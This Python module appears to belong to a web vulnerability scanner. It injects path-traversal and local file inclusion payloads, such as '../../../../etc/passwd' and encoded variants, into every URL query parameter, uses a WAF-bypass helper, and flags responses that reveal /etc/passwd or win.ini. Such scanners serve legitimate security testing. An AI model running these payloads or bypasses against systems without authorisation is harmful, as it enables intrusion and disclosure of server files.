"""Local File Inclusion & Path Traversal scanner combining `traversal`, `lfi_advanced` & WAF bypass."""
import re
import urllib.parse
from core.http import get
from core.waf_bypass import probe_with_mutex_bypass
from core.findings import Finding
from core.memory import log_event

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]


def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return findings

    base_r = get(url)
    if "root:x:0:0" in (base_r.text or ""):
        return findings

    for param in list(qs.keys()):
        for payload in LFI_PAYLOADS:
            r, used_payload, bypass_tag = probe_with_mutex_bypass(
                url, param, payload, vuln_class="lfi", baseline_status=base_r.status or 200
            )
            if r.status == 0:
                continue
            body = r.text or ""
            if re.search(r"root:[^:\n]*:0:0:", body) or "[extensions]" in body.lower():
                findings.append(Finding(
                    id=f"lfi-{hash(url + param + used_payload) & 0xffff:x}",
                    target=parsed.netloc,
                    type="Local File Inclusion / Path Traversal",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload=used_payload,
                    evidence="System file content (`/etc/passwd` / `win.ini`) read via path traversal",
                    request=r.raw_request,
                    response_snippet=r.snippet(300),
                    confidence=0.92,
                    detected_by="hunter:lfi",
                    waf_bypass_used=bypass_tag,
                ))
                break
    log_event(parsed.netloc, "lfi_scan", {"url": url, "findings": len(findings)})
    return findings
